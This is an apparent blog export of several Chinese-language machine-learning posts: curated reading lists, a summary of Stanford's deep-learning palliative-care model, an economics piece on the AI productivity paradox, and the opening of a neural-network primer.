<li><a href="http://juliandewit.github.io/kaggle-ndsb2017?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Can you improve lung cancer detection? 2nd place solution for the Data Science Bowl 2017.</a></li>
<li><a href="https://stanfordmlgroup.github.io/projects/improving-palliative-care?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Improving Palliative Care with Deep Learning - Andrew Ng</a></li>
<li><a href="https://blog.insightdatascience.com/heart-disease-diagnosis-with-deep-learning-c2d92c27e730?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Heart Disease Diagnosis with Deep Learning</a></li>
</ul>
<h4 id="基于深度学习识别姑息治疗患者"><a href="#基于深度学习识别姑息治疗患者" class="headerlink" title="基于深度学习识别姑息治疗患者"></a>基于深度学习识别姑息治疗患者</h4><p>Stanford ML Group 建立了一个使用深度学习算法的程序，根据电子健康记录（Electronic Health Record ，EHR，包括病历、心电图、医疗影像等信息）数据确定在未来3-12个月高风险死亡的住院患者。这些病人的预警信息将发送给姑息治疗小组，这有助于姑息护理小组尽早介入、提供服务。</p>
<p>姑息治疗（Palliative Care ，在日本、中国台湾翻译为舒缓医学）起源于 hospice运动，最早起源于公元四世纪。根据世界卫生组织的定义，姑息治疗强调控制疼痛及患者有关症状，并对心理、社会和精神问题予以重视，目的是为病人和家属赢得最好的生活质量。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-News-201802-3.png" alt=""></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-News-201802-2.png" alt=""></p>
<p>预测模型是一个 18 层的深度神经网络，输入参数为一个病人的 EHR 数据，输出为未来 3-12 个月死亡的概率。训练数据采用斯坦福医院 EHR 数据库中的历史数据，包含超过 200 万名患者的数据。EHR 数据包括患者过去 12 个月的诊断结论、治疗程序、处方和相关细节（经过脱敏和技术处理，以替代码的形式表示），所有数据被转换成 13654 维的特征向量。训练好的模型 AUROC 评分达到 0.93 ，交叉验证的平均精度为0.69 分。</p>
<p>对于机器学习系统来说，使用户可以根据预测结果采取行动，需要提供预测结果的详细解释，这点对于建立用户信心至关重要。Stanford 的程序可以自动生成一个报告，在病人的 EHR 数据中高亮突出对于预测结果具有重要影响因子的条目。</p>
<p><br></p>
<h3 id="智能演说-Speech-AI"><a href="#智能演说-Speech-AI" class="headerlink" title="智能演说 Speech AI"></a>智能演说 Speech AI</h3><ul>
<li><a href="https://arxiv.org/abs/1703.10135?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Tacotron: A Fully End-to-End Text-To-Speech Synthesis Model - Data Scientists at Google</a></li>
<li><a href="https://distill.pub/2017/ctc/?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Sequence Modeling with CTC</a></li>
<li><a href="https://arxiv.org/abs/1702.07825?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Deep Voice: Real-time Neural Text-to-Speech - Baidu Silicon Valley AI Lab</a></li>
<li><a href="https://machinelearning.apple.com/2017/08/06/siri-voices.html?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Deep Learning for Siri’s Voice: On-device Deep Mixture Density Networks for Hybrid Unit Selection Synthesis - Apple</a></li>
</ul>
<p><br></p>
<h3 id="智能音乐-Music-AI"><a href="#智能音乐-Music-AI" class="headerlink" title="智能音乐 Music AI"></a>智能音乐 Music AI</h3><ul>
<li><a href="https://www.youtube.com/watch?v=SacogDL_4JU?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Computer evolves to generate baroque music!</a></li>
<li><a href="https://magenta.tensorflow.org/nsynth-instrument?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Make your own music with WaveNets: Making a Neural Synthesizer Instrument</a></li>
</ul>
<p><br></p>
<h3 id="自然语言处理-Natural-Language-Processing"><a href="#自然语言处理-Natural-Language-Processing" class="headerlink" title="自然语言处理 Natural Language Processing"></a>自然语言处理 Natural Language Processing</h3><ul>
<li><a href="https://openai.com/blog/learning-to-communicate?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Learning to communicate: Agents developing their own language - OpenAI Research</a></li>
<li><a href="https://medium.freecodecamp.com/big-picture-machine-learning-classifying-text-with-neural-networks-and-tensorflow-d94036ac2274?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Big Picture Machine Learning: Classifying Text with Neural Networks and TensorFlow</a></li>
<li><a href="https://code.facebook.com/posts/1978007565818999/a-novel-approach-to-neural-machine-translation?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">A novel approach to neural machine translation - Facebook AI Research</a></li>
<li><a href="https://blog.conceptnet.io/2017/07/13/how-to-make-a-racist-ai-without-really-trying?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">How to make a racist AI without really trying</a></li>
</ul>
<p><br></p>
<h3 id="预测-Prediction"><a href="#预测-Prediction" class="headerlink" title="预测 Prediction"></a>预测 Prediction</h3><ul>
<li><a href="https://medium.com/airbnb-engineering/using-machine-learning-to-predict-value-of-homes-on-airbnb-9272d3d4739d?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Using Machine Learning to Predict Value of Homes On Airbnb</a></li>
<li><a href="https://eng.uber.com/neural-networks-uncertainty-estimation?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Engineering Uncertainty Estimation in Neural Networks for Time Series Prediction at Uber</a></li>
<li><a href="https://research.googleblog.com/2017/02/using-machine-learning-to-predict.html?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">Using Machine Learning to make parking easier</a></li>
<li><a href="https://www.youtube.com/watch?v=ftMq5ps503w?utm_source=mybridge&amp;utm_medium=email&amp;utm_campaign=read_more">How to Predict Stock Prices Easily - Intro to Deep Learning #7</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI技术原理|推荐书单</title>
    <url>/2018/01/25/Machine-Learning-Books/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Background</li>
<li>统计学 | Statistics</li>
<li>Machine learning</li>
<li>Deep learning</li>
</ul>
<span id="more"></span>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><ul>
<li><a href="https://book.douban.com/subject/10750155/">吴军|《数学之美》</a></li>
<li><a href="https://book.douban.com/subject/6021440/">《黑客与画家》</a></li>
</ul>
<h2 id="在线学习项目"><a href="#在线学习项目" class="headerlink" title="在线学习项目"></a>在线学习项目</h2><ul>
<li><a href="fast.ai">Fast.ai</a>: 创始人 杰里米·霍华德（Jeremy Howard）、雷切尔·托马斯（Rachel Thomas）</li>
<li><a href="deeplearning.ai">deeplearning.ai</a></li>
</ul>
<h2 id="统计学-Statistics"><a href="#统计学-Statistics" class="headerlink" title="统计学 | Statistics"></a>统计学 | Statistics</h2><ul>
<li><a href="http://www-bcf.usc.edu/~gareth/ISL/">An Introduction to Statistical Learning with Applications in R</a></li>
<li><a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning:Data Mining, Inference, and Prediction.</a></li>
<li><a href="https://www.zabaras.com/statisticalcomputing">Statistical Computing for Scientists and Engineers | University of Notre Dame, Fall 2017</a></li>
<li><a href="https://betanalpha.github.io/assets/case_studies/probability_theory.html#1_setting_a_foundation">Probability Theory (For Scientists and Engineers) Michael Betancourt | April 2018</a></li>
</ul>
<h2 id="课程-深度学习"><a href="#课程-深度学习" class="headerlink" title="课程 | 深度学习"></a>课程 | 深度学习</h2><ul>
<li><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.161.3556&amp;rep=rep1&amp;type=pdf">A Beginner’s Guide to the Mathematics of Neural Networks</a></li>
<li><a href="https://mp.weixin.qq.com/s/0lBnO9uxADFtAm8sTwqsfg">UC Berkeley CS 294深度强化学习课程（附视频与PPT）(Eng)</a></li>
</ul>
<h2 id="推荐书单"><a href="#推荐书单" class="headerlink" title="推荐书单"></a>推荐书单</h2><ul>
<li><a href="https://book.douban.com/subject/27087503/">《深度学习》|原作名: Deep Learning: Adaptive Computation and Machine Learning series</a></li>
<li><a href="https://book.douban.com/subject/26757965/">《机器学习导论（原书第3版）》</a></li>
<li><a href="https://book.douban.com/subject/26379661/">《Deep Learning》| Josh Patterson</a></li>
<li><a href="#">《概率编程实战》</a></li>
<li><a href="https://book.douban.com/subject/26840215/">《Hands-On Machine Learning with Scikit-Learn and TensorFlow》</a></li>
<li><a href="https://book.douban.com/subject/24703171/">《Machine Learning in Action | 机器学习实战》</a> 中译  python-lang</li>
</ul>
<h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><ul>
<li><a href="http://www.datadan.io/building-a-neural-net-from-scratch-in-go/">Building a Neural Net from Scratch in Go | Daniel Whitenack</a></li>
</ul>
<h2 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/NII_ZqalRjx9su7d6u4MHw">谷歌云官方：一小时掌握深度学习和 TensorFlow（视频+50PPT）2017-01-24 新智元</a></li>
<li><a href="https://developers.google.com/machine-learning/crash-course/">Google 制作的节奏紧凑、内容实用的机器学习简介课程 | 使用 TensorFlow API</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/news/2016/07/OliverSchabenberger-AnalyticSer?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">统计建模与机器学习的区别</a>:Oliver Schabenberger是商业分析与商业智能软件SAS的副总裁，Analytic Server的研发主管，他还是美国统计协会ASA的会士。</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Keras</title>
    <url>/2018/03/07/Machine-Learning-Keras/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
<li><a href="https://github.com/emilwallner/Screenshot-to-code-in-Keras">A neural network that transforms a screenshot into a static website</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://blog.cloudera.com/blog/2017/07/prophecy-fulfilled-keras-and-cloudera-data-science-workbench/">Prophecy Fulfilled: Keras and Cloudera Data Science Workbench</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>AI产业资讯：经济学家谈人工智能</title>
    <url>/2018/03/09/Machine-Learning-Economist/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>为什么人工智能的繁荣没有提高生产率</li>
<li>Artificial Intelligence is a General Purpose Technology</li>
<li>Measuring AI Capital</li>
</ul>
<span id="more"></span>
<h2 id="Previous-Posts"><a href="#Previous-Posts" class="headerlink" title="Previous Posts"></a>Previous Posts</h2><ul>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li>媒体报道|经济学人：译者的悲伤 | 20170527</li>
<li>媒体报道|经济学人：计算机如何学习人类语言？| 20170111</li>
</ul>
<h2 id="为什么人工智能的繁荣没有提高生产率"><a href="#为什么人工智能的繁荣没有提高生产率" class="headerlink" title="为什么人工智能的繁荣没有提高生产率"></a>为什么人工智能的繁荣没有提高生产率</h2><p>人工智能技术的进步无处不在，从自动驾驶汽车到机器人助理到高级语音识别。到处都是，除了生产力统计数据。这种情况看起来像是索洛悖论（Solow Paradox，又称 Productivity Paradox 生产率悖论）的重演，1987 年由麻省理工学院（ MIT，Massachusetts Institute of Technology）经济学家和诺贝尔奖得主罗伯特·索洛所阐述的理论。最近一项研究认为索洛悖论的罪魁祸首可能是实施新技术的滞后，研究人员包括 MIT 斯隆管理学院的教授 <a href="http://ebusiness.mit.edu/erik/">Erik Brynjolfsson</a>，MIT 博士生 Daniel Rock 和芝加哥大学布斯商学院（University of Chicago Booth School of Business）的经济学教授 <a href="https://www.chicagobooth.edu/faculty/directory/s/chad-syverson">Chad Syverson</a>。</p>
<p>根据市场调研公司 CB Insights 的数据，尽管以科技为中心的纳斯达克综合指数（Nasdaq Composite Index）从 2012 年到 2017 年翻了一番，与人工智能相关的技术投资在 2016 年激增了八倍以上、超过 50 亿美元。但这些并没有促进劳动生产率（labor-productivity）的增长，2005 年到 2017 年的增长率还不到 1995 年至 2004 年年均增长率（3％）的一半。</p>
<p>尽管如此，研究人员认为依然有理由持乐观态度，他们认为新技术需要时间在整个经济中传播和实施。他们引用了蒸汽机，电力和内燃机的案例，这些发明都是通过几年和几十年的时间才发挥变革性影响。因为这些技术的广泛应用还需要其他配套技术创新。研究人员指出，交流电安全实用三十年后，至少有一半的美国制造商还没有通电，因为制造商还没有弄清楚如何基于小型电动机重组生产过程。研究人员说这并不罕见; 企业几乎总是花费更多的精力来重新设计业务流程和培训人员，而不是为自己购买新技术。</p>
<h4 id="Artificial-Intelligence-is-a-General-Purpose-Technology"><a href="#Artificial-Intelligence-is-a-General-Purpose-Technology" class="headerlink" title="Artificial Intelligence is a General Purpose Technology"></a><strong>Artificial Intelligence is a General Purpose Technology</strong></h4><blockquote>
<p>As important as specific applications of AI may be, we argue that the more important economic effects of AI, machine learning, and associated new technologies stem from the fact that they embody the characteristics of general purpose technologies (GPTs).</p>
</blockquote>
<p>例如，机器学习系统（machine learning system）已经将机器的能力转化为执行许多基本的知觉类型，以实现更广泛的应用。机器视觉 — 查看和识别物体的能力，在照片中标记它们，并解读视频流。识别错误率地改善，从1/30(帧) 提高到 1/30万(帧)，自动驾驶汽车越来越具有可行性。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-Paper-Paradox.png" alt="AI技术进步&amp;图像识别错误率"></p>
<h4 id="Measuring-AI-Capital"><a href="#Measuring-AI-Capital" class="headerlink" title="Measuring AI Capital"></a><strong>Measuring AI Capital</strong></h4><p>研究人员提出人工智能应视为新的资本形式，确切说是一种无形资本，这种资本会随着投资的增加而累积，会对生产率持续产生作用，其价值会发生折旧（随着时间流逝而贬值）。</p>
<p>引入人工智能技术而产生的成本、组织变革、新技能等因素需要纳入到无形资本的框架当中并构建新的预测模型（J-Curve），随后的实证研究表明，新的模型可以更好地反映技术对生产率增长的影响作用。</p>
<p>人工智能的影响评估结果取决于各国统计方案中如何衡量人工智能资本（AI ）。人工智能资本计量的主要困难在于其许多产出将是无形的。人工智能大量使用在财务上体现作为其他资本的投入，包括新型软件，以及人力和组织资本，而不是最终消费品。包括人力资本在内的其他大部分资本，与 AI 本身一样，大部分都是无形的。</p>
<p>更具体地说，有效使用人工智能需要开发数据集，建立企业的专业人力资本，并实施新的业务流程。这些都需要大量的资本支出和维护。在古典增长核算模型中，这些无形支出的有形对应物（包括计算资源，服务器和房地产的购买）很容易衡量。另一方面，与之配套的生产投资价值则很难量化。在购买资本资产后，企业还会产生额外的调整成本（adjustment costs）。例如，业务流程重新设计和安装成本。</p>
<blockquote>
<p>Much of the market value of AI capital specifically and IT capital more generally may be derived from the capitalized short-term quasi-rents earned by firms that have already reorganized to extract service flows from new investment.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-Paper-Paradox-Growth.png" alt=""></p>
<p>人工智能悖论与世界的变化是一致的。研究人员考虑了悖论的其他可能原因，其中包括对 AI 的盲目乐观，生产力效益正在发生但被误判，新技术的收益存在但仅限于一小部分工人，给出的解释是实现延迟（<strong>here’s an implementation delay</strong>）。他们写道：“这种看似悖论的两半都是正确的”。在这个观点中，预示着随着应用的扩展，人工智能技术突破对生产力的影响将越来越大。人工智能投资成本高昂，需要配套设施的发展，需要时间和资源来实施。</p>
<h4 id="背景知识：索洛悖论"><a href="#背景知识：索洛悖论" class="headerlink" title="背景知识：索洛悖论"></a>背景知识：索洛悖论</h4><p>20世纪80年代末，美国学者查斯曼(Strassman)调查了292个企业，结果发现这些企业的IT投资和投资回报率(ROI)之间没有明显的关联。</p>
<p>1987 年获得诺贝尔奖的经济学家罗伯特·索洛(Robert Solow)将这种现象称为“生产率悖论”(Productivity Paradox)：“我们到处都看得见计算机，就是在生产率统计方面却看不见计算机（Computers everywhere except in the productivity statistics.）”。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.nber.org/chapters/c14007.pdf">Artificial Intelligence and the Modern Productivity Paradox: A Clash of Expectations and Statistics</a></li>
<li><a href="http://review.chicagobooth.edu/economics/2018/article/why-ai-boom-isn-t-boosting-productivity">why-ai-boom-isn-t-boosting-productivity</a></li>
<li><a href="https://mp.weixin.qq.com/s/WOlrTOUjU0srGAOMg1_ASg">论文代写了解一下：要价63000美元的枪手论文是如何产生的？</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Knownledge-Graph</title>
    <url>/2019/10/13/Machine-Learning-Knownledge-Graph/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>知识图谱的早期理念源于万维网之父 Tim Berners Lee 关于语义网(The Semantic Web) 的设想，旨在采用图的结构(Graph Structure)来建模和记录世界万物之间的关联关系和知识， 以便有效实现更加精准的对象级搜索。经过近二十年的发展，知识图谱的相关技术已经在搜索引擎、智能问答、语言及视觉理解、大数据决策分析、智能设备物联等众多领域得到广泛应用，被公认为是实现认知智能的重要基石。近年来，随着自然语言处理、深度学习、图数据处理等众多领域的飞速发展，知识图谱在自动化知识获取、 基于知识的自然语言处理、基于表示学习的机器推理、基于图神经网络的图挖掘与分析等领域又取得了很多新进展。</p>
<a id="more"></a>
<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><h4 id="浙江大学研究生专业选修课"><a href="#浙江大学研究生专业选修课" class="headerlink" title="浙江大学研究生专业选修课"></a>浙江大学研究生专业选修课</h4><p>课程系统性介绍知识图谱的基本概念、核心技术内涵和应用实践方法，具体内容涉及知识表示与推理、图数据库、关系抽取与知识图谱构建、知识图谱表示学习与嵌入、语义搜索与知识问答、图神经网络与图挖掘分析等。课程内容的设计以“基础、前沿与实践”相结合为基本原则，既包括基本概念介绍和实践应用内容，也包括学术界的最新前沿进展的介绍。</p>
<p><strong>前置课程与知识</strong></p>
<p>建议预先修读数据库、机器学习、自然语言处理等课程，熟悉Tensorflow、Pytorch等常用深度学习框架。</p>
<ul>
<li><a href="https://person.zju.edu.cn/huajun#kg" target="_blank" rel="noopener">浙江大学/陈华钧教授</a></li>
<li>教材《知识图谱：方法、实践与应用》，电子工业出版社，2019</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning" target="_blank" rel="noopener">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/" target="_blank" rel="noopener">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/" target="_blank" rel="noopener">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/" target="_blank" rel="noopener">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/" target="_blank" rel="noopener">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/" target="_blank" rel="noopener">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network" target="_blank" rel="noopener">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/" target="_blank" rel="noopener">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News" target="_blank" rel="noopener">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/" target="_blank" rel="noopener">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/" target="_blank" rel="noopener">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/" target="_blank" rel="noopener">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2018/10/03/Machine-Learning-Uber/" target="_blank" rel="noopener">Uber 业务预测系统实践</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://dl.ccf.org.cn/institude/institudeDetail?id=4583103168595968" target="_blank" rel="noopener">文物知识图谱的构建与应用</a></li>
<li><a href="https://dl.ccf.org.cn/journal/queryArticleById?id=4558207919032320" target="_blank" rel="noopener">知识图谱在电网全业务统一数据中心的应用</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>AI技术原理|神经网络基础</title>
    <url>/2018/05/07/Machine-Learning-Neural-Network/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Introduction</li>
<li>工作流程：Forward-Propagation、Backward Propagation、Partial Derivatives、Hyper Parameters</li>
<li>深度网络：A single layer Neural Network、Wide Neural Network  vs  Deep Neural Network</li>
<li>维度诅咒、权衡</li>
</ul>
<span id="more"></span>
<p><img src="http://riboseyim-qiniu.riboseyim.com/AI-Neurons.jpg" alt=""></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>神经网络试图复制人脑的工作以使事情更加智能化。</p>
<p>神经网络通常是一种有监督的学习方法。这意味着需要有一套训练集。理想情况下，训练集合包含了绝对真值（tags | 标签，classes | 类 ）的例子。例如在文本情感分析的情况下，训练集是句子列表和它们各自对应的情绪。（注意：未标记的数据集也可以用来训练神经网络，但这里仅考虑最基本的情况。）</p>
<p>例如：将文本称为 X ，将它们的标签称为 Y 。 有一些函数可以定义 X 和 Y 之间的关系，比如是什么特征（词/短语/句子结构等）导致一个句子是否定的或肯定的的含义。早期的人们习惯于手动查找这些特征，这被称为特征工程（feature engineering）。神经网络使得这一过程实现自动化处理。</p>
<blockquote>
<p>So there are many ways you can understand a concept, choose whichever suits you, being persistent about the learning part. At the end knowing maths is a useful tool when it comes to optimisations or experimentations.</p>
</blockquote>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/NeuralNetwork-Basic-1.jpg" alt=""></p>
<p>人工神经网络由3个组成部分组成：</p>
<ul>
<li>输入层 Input Layer</li>
<li>隐藏（计算）层 Hidden (computation) Layers</li>
<li>输出层 Output Layer</li>
</ul>
<p>学习过程分两步进行：</p>
<ul>
<li>前向传播 Forward-Propagation：猜测答案</li>
<li>反向传播 Back-Propagation：最小化实际答案和猜测答案之间的误差</li>
</ul>
